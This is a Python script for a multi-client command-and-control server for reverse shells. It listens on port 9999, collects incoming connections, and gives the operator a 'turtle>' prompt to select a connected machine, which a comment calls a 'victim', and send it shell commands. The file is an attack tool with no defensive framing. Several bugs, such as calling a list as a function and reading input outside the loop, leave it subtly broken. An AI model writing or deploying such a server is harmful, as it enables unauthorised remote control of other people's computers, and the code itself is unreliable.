import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
allConnection = []
allAddress = []

# Create a Socket ( connect two computer )
def createSocket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening or connections
def bindSocket():
    try:
        global host
        global port
        global s

        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bindSocket()


# Handling connection from multiple clients ans saving to a list
# Closing previous connections when server.py file is restarted
def acceptingConnection():
    for c in allConnection():
        c.close()

    del allConnection[:]
    del allAddress[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)

            allConnection.append(conn)
            allAddress.append(address)

            print("Connection has been established : " + address[0])

        except:
            print("Error accepting connections")


# 2nd thread function - 1) See all the client 2) Select a client 3) Send command to the the connected client
# Interactive prompt for sending commands
# turtle> list


def strartTurtle():
    cmd = input("turtle> ")
    while True:
        if cmd == "list":
            listConnections()

        elif "select" in cmd:
            conn = getTarget(cmd)
            if conn is not None:
                sendTargetCommands(conn)
        else:
            print("Command not recognised")


# Display all current active connections with the client


def listConnections():
    result = ""
    select = 0
    for i, conn in enumerate(allConnection):
        try:
            conn.send(str.encode(" "))
            conn.recv(201480)
        except:
            del allConnection[i]
            del allAddress[i]
            continue
        result = (
            str(i) + " " + str(allAddress[i][0]) + " " + str(allAddress[i][1]) + "\n"
        )

    print("------Clients------" + "\n" + result)


# Selecting the target
def getTarget(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = allConnection(target)
        print("You are now connected to : " + str(allAddress[target][0]))
        print(str(allAddress[target][0]) + ">", end="")
        return conn

    except:
        print("Selection not valid")
        return None


# Send commmands to client/victim or a friend
def sendTargetCommands(conn):
    while True:
        try:
            cmd = input()
            if cmd == "quit":
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                clientResponse = str(conn.recv(20480), "utf-8")
                print(clientResponse, end="")
        except:
            print("Error sending commands")
            break


# Create worker threads
def createWorkers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            createSocket()
            bindSocket()
            acceptingConnection()
        if x == 2:
            strartTurtle()

        queue.task_done()


def createJobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


createWorkers()
createJobs()
